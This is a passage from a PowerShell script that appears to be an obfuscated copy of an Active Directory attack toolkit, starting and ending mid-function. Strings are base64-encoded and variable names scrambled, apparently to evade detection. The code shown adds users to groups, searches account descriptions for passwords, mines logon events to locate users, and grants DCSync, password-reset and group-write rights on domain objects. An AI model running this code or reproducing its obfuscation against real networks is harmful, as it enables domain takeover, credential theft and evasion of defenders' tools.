            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABhAGQAZABpAG4AZwAgAHUAcwBlAHIAIAAkAFUAcwBlAHIATgBhAG0AZQAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
            return
        }
    }
    else {
        try {
            if ($Domain) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAZABvAG0AYQBpAG4AIAAkAEQAbwBtAGEAaQBuAA==')))
                ${/===\/\/=\_/==\/=} = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                ${/=\/\_/====\_____} = ______/====\/=\__/ -Domain $Domain
                if(-not ${/=\/\_/====\_____}) {
                    return $Null
                }
                ${___/\/=\_______/=} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ${/===\/\/=\_/==\/=}, ${/=\/\_/====\_____}            
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAbABvAGMAYQBsAGgAbwBzAHQA')))
                ${___/\/=\_______/=} = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }
            ${_/=\/\/=\_/\__/\/} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${___/\/=\_______/=},$GroupName)
            ${_/=\/\/=\_/\__/\/}.Members.add(${___/\/=\_______/=}, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
            ${_/=\/\/=\_/\__/\/}.Save()
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBkAGQAaQBuAGcAIAAkAFUAcwBlAHIATgBhAG0AZQAgAHQAbwAgACQARwByAG8AdQBwAE4AYQBtAGUAIAA6ACAAJABfAA==')))
        }
    }
}
function Get-UserProperty {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    if($Properties) {
        $Properties = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + $Properties
        __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | select -Property $Properties
    }
    else {
        __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | select -First 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
filter Find-UserField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    __/=\_/\_/\/=\___/ -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAkAFMAZQBhAHIAYwBoAEYAaQBlAGwAZAA9ACoAJABTAGUAYQByAGMAaABUAGUAcgBtACoAKQA='))) -PageSize $PageSize | select samaccountname,$SearchField
}
filter _/=\/=\__/=\__/==\ {
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = $Env:ComputerName,
        [String]
        [ValidateSet("logon","tgt","all")]
        ${___/=\/=\_/\_/\__/} = "logon",
        [DateTime]
        ${____/\___/=\/\_/=\} = [DateTime]::Today.AddDays(-5),
        [Management.Automation.PSCredential]
        $Credential
    )
    if(${___/=\/=\_/\_/\__/}.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAA==')))) {
        [Int32[]]${/=====\/\/==\_/=\} = @(4624)
    }
    elseif(${___/=\/=\_/\_/\__/}.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABnAHQA')))) {
        [Int32[]]${/=====\/\/==\_/=\} = @(4768)
    }
    else {
        [Int32[]]${/=====\/\/==\_/=\} = @(4624, 4768)
    }
    if($Credential) {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGkAdgBlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
        ${__/\_/\/===\/=\_/} = @{
            'ComputerName' = $ComputerName;
            'Credential' = $Credential;
            'FilterHashTable' = @{ LogName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA=='))); ID=${/=====\/\/==\_/=\}; StartTime=${____/\___/=\/\_/=\}};
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')));
        }
    }
    else {
        ${__/\_/\/===\/=\_/} = @{
            'ComputerName' = $ComputerName;
            'FilterHashTable' = @{ LogName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA=='))); ID=${/=====\/\/==\_/=\}; StartTime=${____/\___/=\/\_/=\}};
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')));            
        }
    }
    Get-WinEvent @__/\_/\/===\/=\_/ | % {
        if(${/=====\/\/==\_/=\} -contains 4624) {    
            if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEwAbwBnAG8AbgAgAFQAeQBwAGUAOgApAC4AKgA/ACgAPwA9ACgASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAgAEwAZQB2AGUAbAA6AHwATgBlAHcAIABMAG8AZwBvAG4AOgApACkA')))) {
                if(${___/=\_/=\/\__/==}) {
                    ${/===\_/=\/==\/==\} = ${___/=\_/=\/\__/==}[0].trim()
                    ${___/=\_/=\/\__/==} = $Null
                }
            }
            else {
                ${/===\_/=\/==\/==\} = ""
            }
            if ((${/===\_/=\/==\/==\} -eq 2) -or (${/===\_/=\/==\/==\} -eq 3)) {
                try {
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB3ACAATABvAGcAbwBuADoAKQAuACoAPwAoAD8APQBQAHIAbwBjAGUAcwBzACAASQBuAGYAbwByAG0AYQB0AGkAbwBuADoAKQA=')))) {
                        if(${___/=\_/=\/\__/==}) {
                            $UserName = ${___/=\_/=\/\__/==}[0].split("`n")[2].split(":")[1].trim()
                            $Domain = ${___/=\_/=\/\__/==}[0].split("`n")[3].split(":")[1].trim()
                            ${___/=\_/=\/\__/==} = $Null
                        }
                    }
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAbwB1AHIAYwBlACAAUABvAHIAdAA6ACkA')))) {
                        if(${___/=\_/=\/\__/==}) {
                            ${__/\/=\/==\/\____} = ${___/=\_/=\/\__/==}[0].split("`n")[2].split(":")[1].trim()
                            ${___/=\_/=\/\__/==} = $Null
                        }
                    }
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBOAE8ATgBZAE0ATwBVAFMAIABMAE8ARwBPAE4A'))))) {
                        ${__/\/=\__/\_/\/=\} = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = ${__/\/=\/==\/\____}
                            'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA2ADIANAA=')))
                            'LogonType' = ${/===\_/=\/==\/==\}
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property ${__/\/=\__/\_/\/=\}
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAGUAdgBlAG4AdAAgAGwAbwBnAHMAOgAgACQAXwA=')))
                }
            }
        }
        if(${/=====\/\/==\_/=\} -contains 4768) {
            try {
                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEEAYwBjAG8AdQBuAHQAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAZQByAHYAaQBjAGUAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if(${___/=\_/=\/\__/==}) {
                        $Username = ${___/=\_/=\/\__/==}[0].split("`n")[1].split(":")[1].trim()
                        $Domain = ${___/=\_/=\/\__/==}[0].split("`n")[2].split(":")[1].trim()
                        ${___/=\_/=\/\__/==} = $Null
                    }
                }
                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AEEAZABkAGkAdABpAG8AbgBhAGwAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if(${___/=\_/=\/\__/==}) {
                        ${__/\/=\/==\/\____} = ${___/=\_/=\/\__/==}[0].split("`n")[1].split(":")[-1].trim()
                        ${___/=\_/=\/\__/==} = $Null
                    }
                }
                ${__/\/=\__/\_/\/=\} = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = ${__/\/=\/==\/\____}
                    'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3ADYAOAA=')))
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }
                New-Object -TypeName PSObject -Property ${__/\/=\__/\_/\/=\}
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAGUAdgBlAG4AdAAgAGwAbwBnAHMAOgAgACQAXwA=')))
            }
        }
    }
}
function __/=\_/=\_/\___/== {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $SamAccountName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $Name = "*",
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $DistinguishedName = "*",
        [Switch]
        $ResolveGUIDs,
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        ${___/\/\/\__/==\/=\},
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        ${/==\/=\_/\__/\/=\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize 
        if($ResolveGUIDs) {
            ${___/\_/==\/=\/===} = __/=\__/==\/==\_/= -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    process {
        if (${/==\/=\_/\__/\/=\}) {
            if($SamAccountName) {
                ${/==\/=\_/\__/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAD0AJABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAoAG4AYQBtAGUAPQAkAE4AYQBtAGUAKQAoAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA9ACQARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))  
            }
            else {
                ${/==\/=\_/\__/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQATgBhAG0AZQApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJABEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUAKQAkAEYAaQBsAHQAZQByACkA')))  
            }
            try {
                ${__/==\/===\/\/\/=} = ${/==\/=\_/\__/\/=\}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    ${_/=====\/=\___/==\} = [adsi]($_.path)
                    if(${_/=====\/=\___/==\}.distinguishedname) {
                        ${/====\__/==\____/} = ${_/=====\/=\___/==\}.PsBase.ObjectSecurity.access
                        ${/====\__/==\____/} | % {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/=====\/=\___/==\}.distinguishedname[0]
                            if(${_/=====\/=\___/==\}.objectsid[0]){
                                ${/==\_/==\___/==\_} = (New-Object System.Security.Principal.SecurityIdentifier(${_/=====\/=\___/==\}.objectsid[0],0)).Value
                            }
                            else {
                                ${/==\_/==\___/==\_} = $Null
                            }
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${/==\_/==\___/==\_}
                            $_
                        }
                    }
                } | % {
                    if(${___/\/\/\__/==\/=\}) {
                        ${/=====\/=\/\__/=\} = Switch (${___/\/\/\__/==\/=\}) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA')))}
                        }
                        if($_.ObjectType -eq ${/=====\/=\/\__/=\}) { $_ }
                    }
                    else {
                        $_
                    }
                } | % {
                    if(${___/\_/==\/=\/===}) {
                        ${__/\_/\/==\/\/===} = @{}
                        $_.psobject.properties | % {
                            if( ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) -or ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) ) {
                                try {
                                    ${__/\_/\/==\/\/===}[$_.Name] = ${___/\_/==\/=\/===}[$_.Value.toString()]
                                }
                                catch {
                                    ${__/\_/\/==\/\/===}[$_.Name] = $_.Value
                                }
                            }
                            else {
                                ${__/\_/\/==\/\/===}[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property ${__/\_/\/==\/\/===}
                    }
                    else { $_ }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/==\/=\_/\__/\/=\}.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Add-ObjectAcl {
    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,
        [String]
        $TargetName = "*",
        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",
        [String]
        $TargetFilter,
        [String]
        $TargetADSpath,
        [String]
        $TargetADSprefix,
        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,
        [String]
        $PrincipalName,
        [String]
        $PrincipalSamAccountName,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = "All",
        [String]
        $RightsGUID,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        ${/==\/=\_/\__/\/=\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize
        if($PrincipalSID) {
            ${______/\_/=\_/\_/} = $PrincipalSID
        }
        else {
            ${____/\__/==\/===\} = ___/\/\/\/\/==\/\_ -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            if(!${____/\__/==\/===\}) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
            }
            ${______/\_/=\_/\_/} = ${____/\__/==\/===\}.objectsid
        }
        if(!${______/\_/=\_/\_/}) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
        }
    }
    process {
        if (${/==\/=\_/\__/\/=\}) {
            if($TargetSamAccountName) {
                ${/==\/=\_/\__/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAD0AJABUAGEAcgBnAGUAdABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAKQAoAG4AYQBtAGUAPQAkAFQAYQByAGcAZQB0AE4AYQBtAGUAKQAoAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA9ACQAVABhAHIAZwBlAHQARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACkAJABUAGEAcgBnAGUAdABGAGkAbAB0AGUAcgApAA==')))  
            }
            else {
                ${/==\/=\_/\__/\/=\}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbgBhAG0AZQA9ACQAVABhAHIAZwBlAHQATgBhAG0AZQApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJABUAGEAcgBnAGUAdABEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUAKQAkAFQAYQByAGcAZQB0AEYAaQBsAHQAZQByACkA')))  
            }
            try {
                ${__/==\/===\/\/\/=} = ${/==\/=\_/\__/\/=\}.FindAll()
                ${__/==\/===\/\/\/=} | ? {$_} | % {
                    ${/=\/\/\/\/=\/\_/\} = $_.Properties.distinguishedname
                    ${/====\/\_/==\/\__} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${______/\_/=\_/\_/})
                    ${_/=\_/===\/\_/\__} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                    ${/=\/\/\__/\_/\_/\} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
                    ${/======\__/==\/==} = @()
                    if($RightsGUID) {
                        ${___/\_/==\/=\/===} = @($RightsGUID)
                    }
                    else {
                        ${___/\_/==\/=\/===} = Switch ($Rights) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                        }
                    }
                    if(${___/\_/==\/=\/===}) {
                        foreach(${__/\__/\______/\__} in ${___/\_/==\/=\/===}) {
                            ${_/==\/=\______/\_} = New-Object Guid ${__/\__/\______/\__}
                            ${/=\__/\____/==\/\} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${/======\__/==\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule ${/====\/\_/==\/\__},${/=\__/\____/==\/\},${/=\/\/\__/\_/\_/\},${_/==\/=\______/\_},${_/=\_/===\/\_/\__}
                        }
                    }
                    else {
                        ${/=\__/\____/==\/\} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${/======\__/==\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule ${/====\/\_/==\/\__},${/=\__/\____/==\/\},${/=\/\/\__/\_/\_/\},${_/=\_/===\/\_/\__}
                    }
                    Write-Verbose "Granting principal ${______/\_/=\_/\_/} '$Rights' on $($_.Properties.distinguishedname)"
                    try {
                        ForEach (${____/\/\__/\/====} in ${/======\__/==\/==}) {
                            Write-Verbose "Granting principal ${______/\_/=\_/\_/} '$(${____/\/\__/\/====}.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            ${_/=====\/=\___/==\} = [adsi]($_.path)
                            ${_/=====\/=\___/==\}.PsBase.ObjectSecurity.AddAccessRule(${____/\/\__/\/====})
                            ${_/=====\/=\___/==\}.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwByAGEAbgB0AGkAbgBnACAAcAByAGkAbgBjAGkAcABhAGwAIAAkAHsAXwBfAF8AXwBfAF8ALwBcAF8ALwA9AFwAXwAvAFwAXwAvAH0AIAAnACQAUgBpAGcAaAB0AHMAJwAgAG8AbgAgACQAewAvAD0AXAAvAFwALwBcAC8AXAAvAD0AXAAvAFwAXwAvAFwAfQAgADoAIAAkAF8A')))
                    }
                }
                ${__/==\/===\/\/\/=}.dispose()
                ${/==\/=\_/\__/\/=\}.dispose()
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
            }
        }
    }
}
function Invoke-ACLScanner {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name = "*",
        [Alias('DN')]
        [String]
        $DistinguishedName = "*",
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveGUIDs,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    __/=\_/=\_/\___/== @PSBoundParameters | % {
        $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | ? {
        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | ? {
        ($_.ActiveDirectoryRights -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUA')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))
    }
}
filter __/=\__/==\/==\_/= {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${___/\_/==\/=\/===} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${__/=\/====\/=\_/\} = (___/\____/\/\_/\__).schema.name
    ${/=\/==\_/==\/\___} = __/=====\_/\_/==== -ADSpath ${__/=\/====\/=\_/\} -DomainController $DomainController -PageSize $PageSize
    if(${/=\/==\_/==\/\___}) {
        ${/=\/==\_/==\/\___}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
        try {
            ${__/==\/===\/\/\/=} = ${/=\/==\_/==\/\___}.FindAll()
            ${__/==\/===\/\/\/=} | ? {$_} | % {
                ${___/\_/==\/=\/===}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            ${__/==\/===\/\/\/=}.dispose()
            ${/=\/==\_/==\/\___}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAYgB1AGkAbABkAGkAbgBnACAARwBVAEkARAAgAG0AYQBwADoAIAAkAF8A')))
        }
    }
    ${/==\___/\____/=\_} = __/=====\_/\_/==== -ADSpath ${__/=\/====\/=\_/\}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA')))) -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    if (${/==\___/\____/=\_}) {
        ${/==\___/\____/=\_}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
        try {
            ${__/==\/===\/\/\/=} = ${/==\___/\____/=\_}.FindAll()
            ${__/==\/===\/\/\/=} | ? {$_} | % {
                ${___/\_/==\/=\/===}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            ${__/==\/===\/\/\/=}.dispose()
            ${/==\___/\____/=\_}.dispose()
        }
        catch {
